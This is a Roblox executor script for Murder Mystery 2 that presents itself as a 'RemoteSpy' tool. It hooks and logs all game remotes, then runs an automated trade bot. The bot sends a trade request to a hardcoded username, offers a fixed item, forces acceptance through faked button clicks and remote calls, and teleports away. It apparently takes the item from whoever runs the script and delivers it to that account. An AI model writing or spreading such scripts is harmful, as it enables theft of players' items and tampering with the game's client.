-- ============================================
-- MM2 Trade Bot v10 — Built-in RemoteSpy GUI
-- Generated by Cobalt — https://gitlab.com/upio/cobalt
-- Hooks all remotes, shows args live in GUI
-- ============================================

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

local Trade = ReplicatedStorage:WaitForChild("Trade", 10)
local SendRequest = Trade:WaitForChild("SendRequest", 10)
local OfferItem   = Trade:WaitForChild("OfferItem", 10)
local AcceptTrade = Trade:WaitForChild("AcceptTrade", 10)

local TARGET_USERNAME = "aquxtic_jaz"
local ITEM_DATAID     = "Strawberries_G_2026"
local ITEM_TYPE       = "Weapons"

local VIM = pcall(function() return game:GetService("VirtualInputManager") end)
    and game:GetService("VirtualInputManager") or nil

-- ── RemoteSpy GUI ─────────────────────────────────────────────────────────────

local spyScreen = Instance.new("ScreenGui")
spyScreen.Name = "RemoteSpy"
spyScreen.ResetOnSpawn = false
spyScreen.DisplayOrder = 1000
spyScreen.Parent = PlayerGui

-- drag frame
local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 340, 0, 420)
frame.Position = UDim2.new(0, 10, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = spyScreen

Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 8)

-- title bar
local titleBar = Instance.new("Frame")
titleBar.Size = UDim2.new(1, 0, 0, 32)
titleBar.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
titleBar.BorderSizePixel = 0
titleBar.Parent = frame
Instance.new("UICorner", titleBar).CornerRadius = UDim.new(0, 8)

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, -10, 1, 0)
title.Position = UDim2.new(0, 10, 0, 0)
title.BackgroundTransparency = 1
title.Text = "🔍 RemoteSpy — CobaltBot"
title.TextColor3 = Color3.fromRGB(0, 255, 100)
title.TextScaled = true
title.Font = Enum.Font.GothamBold
title.TextXAlignment = Enum.TextXAlignment.Left
title.Parent = titleBar

-- clear button
local clearBtn = Instance.new("TextButton")
clearBtn.Size = UDim2.new(0, 60, 0, 24)
clearBtn.Position = UDim2.new(1, -68, 0, 4)
clearBtn.BackgroundColor3 = Color3.fromRGB(180, 40, 40)
clearBtn.Text = "CLEAR"
clearBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
clearBtn.TextScaled = true
clearBtn.Font = Enum.Font.GothamBold
clearBtn.Parent = titleBar
Instance.new("UICorner", clearBtn).CornerRadius = UDim.new(0, 4)

-- scroll frame for log
local scroll = Instance.new("ScrollingFrame")
scroll.Size = UDim2.new(1, -8, 1, -40)
scroll.Position = UDim2.new(0, 4, 0, 36)
scroll.BackgroundTransparency = 1
scroll.ScrollBarThickness = 4
scroll.ScrollBarImageColor3 = Color3.fromRGB(0, 255, 100)
scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
scroll.Parent = frame

local layout = Instance.new("UIListLayout")
layout.SortOrder = Enum.SortOrder.LayoutOrder
layout.Padding = UDim.new(0, 4)
layout.Parent = scroll

local entryCount = 0

-- log entry colors per remote type
local colors = {
    FireServer   = Color3.fromRGB(255, 180, 0),
    InvokeServer = Color3.fromRGB(0, 180, 255),
    FireAllClients = Color3.fromRGB(255, 80, 80),
    OnClientEvent = Color3.fromRGB(180, 0, 255),
}

local function serialize(v, depth)
    depth = depth or 0
    if depth > 3 then return "..." end
    local t = typeof(v)
    if t == "string" then return '"' .. v .. '"'
    elseif t == "number" then return tostring(v)
    elseif t == "boolean" then return tostring(v)
    elseif t == "nil" then return "nil"
    elseif t == "Instance" then return "[" .. v.ClassName .. "] " .. v:GetFullName()
    elseif t == "table" then
        local parts = {}
        for k, val in pairs(v) do
            table.insert(parts, tostring(k) .. "=" .. serialize(val, depth+1))
        end
        return "{" .. table.concat(parts, ", ") .. "}"
    elseif t == "Vector3" then
        return string.format("V3(%.1f,%.1f,%.1f)", v.X, v.Y, v.Z)
    elseif t == "Vector2" then
        return string.format("V2(%.1f,%.1f)", v.X, v.Y)
    elseif t == "CFrame" then
        return string.format("CF(%.1f,%.1f,%.1f)", v.X, v.Y, v.Z)
    elseif t == "EnumItem" then
        return tostring(v)
    else
        return "[" .. t .. "]"
    end
end

local function addEntry(remoteName, method, args)
    entryCount = entryCount + 1
    local color = colors[method] or Color3.fromRGB(200, 200, 200)

    local entry = Instance.new("Frame")
    entry.Size = UDim2.new(1, -8, 0, 0)
    entry.AutomaticSize = Enum.AutomaticSize.Y
    entry.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
    entry.BorderSizePixel = 0
    entry.LayoutOrder = entryCount
    entry.Parent = scroll
    Instance.new("UICorner", entry).CornerRadius = UDim.new(0, 4)
    Instance.new("UIPadding", entry).PaddingLeft = UDim.new(0, 6)

    -- remote name + method
    local header = Instance.new("TextLabel")
    header.Size = UDim2.new(1, -6, 0, 20)
    header.BackgroundTransparency = 1
    header.Text = "▶ " .. remoteName .. ":" .. method
    header.TextColor3 = color
    header.TextScaled = true
    header.Font = Enum.Font.GothamBold
    header.TextXAlignment = Enum.TextXAlignment.Left
    header.Parent = entry

    -- args
    local argParts = {}
    for i, arg in ipairs(args) do
        table.insert(argParts, "arg" .. i .. ": " .. serialize(arg))
    end
    local argText = #argParts > 0 and table.concat(argParts, "\n") or "no args"

    local argLabel = Instance.new("TextLabel")
    argLabel.Size = UDim2.new(1, -6, 0, 0)
    argLabel.AutomaticSize = Enum.AutomaticSize.Y
    argLabel.Position = UDim2.new(0, 0, 0, 20)
    argLabel.BackgroundTransparency = 1
    argLabel.Text = argText
    argLabel.TextColor3 = Color3.fromRGB(180, 180, 180)
    argLabel.TextSize = 11
    argLabel.Font = Enum.Font.Code
    argLabel.TextXAlignment = Enum.TextXAlignment.Left
    argLabel.TextWrapped = true
    argLabel.Parent = entry

    -- copy button
    local copyBtn = Instance.new("TextButton")
    copyBtn.Size = UDim2.new(0, 50, 0, 18)
    copyBtn.Position = UDim2.new(1, -58, 0, 1)
    copyBtn.BackgroundColor3 = Color3.fromRGB(0, 120, 60)
    copyBtn.Text = "COPY"
    copyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    copyBtn.TextScaled = true
    copyBtn.Font = Enum.Font.GothamBold
    copyBtn.Parent = entry
    Instance.new("UICorner", copyBtn).CornerRadius = UDim.new(0, 4)

    copyBtn.MouseButton1Click:Connect(function()
        local full = remoteName .. ":" .. method .. "\n" .. argText
        setclipboard(full)
        copyBtn.Text = "✓"
        task.wait(1)
        copyBtn.Text = "COPY"
    end)

    -- auto scroll to bottom
    scroll.CanvasPosition = Vector2.new(0, scroll.AbsoluteCanvasSize.Y)
end

clearBtn.MouseButton1Click:Connect(function()
    for _, v in ipairs(scroll:GetChildren()) do
        if v:IsA("Frame") then v:Destroy() end
    end
    entryCount = 0
end)

-- ── Hook all remotes in ReplicatedStorage ─────────────────────────────────────

local hooked = {}

local function hookRemote(remote)
    if hooked[remote] then return end
    hooked[remote] = true

    local name = remote:GetFullName()

    if remote:IsA("RemoteEvent") then
        -- hook FireServer
        local origFire = remote.FireServer
        remote.FireServer = function(self, ...)
            local args = {...}
            addEntry(name, "FireServer", args)
            return origFire(self, ...)
        end

        -- spy incoming OnClientEvent
        remote.OnClientEvent:Connect(function(...)
            addEntry(name, "OnClientEvent", {...})
        end)

    elseif remote:IsA("RemoteFunction") then
        local origInvoke = remote.InvokeServer
        remote.InvokeServer = function(self, ...)
            local args = {...}
            addEntry(name, "InvokeServer", args)
            return origInvoke(self, ...)
        end
    end
end

local function scanDescendants(root)
    for _, v in ipairs(root:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            pcall(hookRemote, v)
        end
    end
end

-- hook everything already there
scanDescendants(ReplicatedStorage)

-- hook anything added later
ReplicatedStorage.DescendantAdded:Connect(function(v)
    if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
        task.wait(0.1)
        pcall(hookRemote, v)
    end
end)

print("[RemoteSpy] Hooked all ReplicatedStorage remotes ✓")

-- ── Trade bot ─────────────────────────────────────────────────────────────────

local function safeCall(fn, label)
    local ok, err = pcall(fn)
    print("[v10] " .. label .. (ok and " ✓" or " ✗ " .. tostring(err)))
end

local function getTarget()
    local t = 0
    local target
    repeat
        task.wait(0.5)
        t = t + 0.5
        target = Players:FindFirstChild(TARGET_USERNAME)
    until target or t >= 15
    return target
end

local function getAcceptButton()
    local gui = PlayerGui:FindFirstChild("TradeGUI_Phone")
    if not gui then return nil end
    local ok, btn = pcall(function()
        return gui.Container.Trade.Actions.Accept.ActionButton
    end)
    return ok and btn or nil
end

local function smashAccept()
    safeCall(function()
        AcceptTrade:FireServer()
    end, "M1 remote")

    local btn = getAcceptButton()
    if btn then
        safeCall(function() btn.MouseButton1Click:Fire() end, "M2 Click")
        safeCall(function() btn.Activated:Fire() end, "M2 Activated")
        safeCall(function()
            btn.MouseButton1Down:Fire(0, 0)
            task.wait(0.05)
            btn.MouseButton1Up:Fire(0, 0)
        end, "M2 Down+Up")

        if VIM then
            local pos = btn.AbsolutePosition
            local size = btn.AbsoluteSize
            local x = pos.X + size.X / 2
            local y = pos.Y + size.Y / 2 + 5
            safeCall(function()
                VIM:SendMouseMoveEvent(x, y, game)
                task.wait(0.05)
                VIM:SendMouseButtonEvent(x, y, 0, true, game, 1)
                task.wait(0.05)
                VIM:SendMouseButtonEvent(x, y, 0, false, game, 1)
            end, "M3 VIM at " .. math.floor(x) .. "," .. math.floor(y))
        end
    end
end

local function run()
    print("[v10] Starting — looking for " .. TARGET_USERNAME .. "...")

    local target = getTarget()
    if not target then
        warn("[v10] Target not found. Stopping.")
        return
    end
    print("[v10] Found target ✓")

    safeCall(function()
        SendRequest:InvokeServer(target)
    end, "SendRequest")

    local phoneGui = PlayerGui:WaitForChild("TradeGUI_Phone", 30)
    local guiOpened = false

    local conn = phoneGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if phoneGui.Enabled then guiOpened = true end
    end)

    local t = 0
    while not guiOpened and t < 30 do
        task.wait(0.5)
        t = t + 0.5
    end
    conn:Disconnect()

    if not guiOpened then
        warn("[v10] Trade never opened. Stopping.")
        return
    end

    print("[v10] Trade GUI open ✓")
    task.wait(0.5)

    safeCall(function()
        OfferItem:FireServer(ITEM_DATAID, ITEM_TYPE)
    end, "OfferItem")

    print("[v10] Waiting 6s for accept window...")
    task.wait(6)

    local tradeDone = false
    local closeConn
    closeConn = phoneGui:GetPropertyChangedSignal("Enabled"):Connect(function()
        if not phoneGui.Enabled then
            tradeDone = true
            if closeConn then closeConn:Disconnect() end
        end
    end)

    local attempts = 0
    while not tradeDone and attempts < 25 do
        attempts = attempts + 1
        print("[v10] Attempt " .. attempts)
        smashAccept()
        task.wait(0.4)
    end

    if tradeDone then
        print("[v10] Trade done ✓ — leaving...")
    else
        print("[v10] Max attempts — leaving anyway...")
    end

    task.wait(1.5)
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end

task.spawn(run)
